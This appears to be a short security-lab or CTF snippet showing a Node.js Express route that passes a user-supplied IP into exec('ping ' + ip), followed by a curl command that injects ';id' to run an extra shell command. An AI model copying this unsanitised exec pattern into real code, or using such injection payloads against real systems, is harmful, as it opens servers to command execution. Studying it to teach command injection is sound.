```javascript
app.post('/', function (req, res) {
    ip = req.body.ip
    if (ip == "") {
        utils.redirect(req, res, '/ping-status');
    } else {
        // getting the command with req.params.command
        var child;
        // console.log(req.params.command);
        child = exec('ping ' + ip, function (error, stdout, stderr) {
            res.render('ping.ejs', {
                isConnected: req.session.isConnected,
                message: stdout,
                isAdmin: req.session.isAdmin
            });
        });
    }
});

server.listen(9000, '127.0.0.1', function() {
  console.log("Listening on port 9000");
});
```

<details>
  <summary><b>Exploite</b></summary>

  ```bash
curl --data 'ip=127.0.0.1 -c 1;id' 127.0.0.1:9000
  ```
</details>
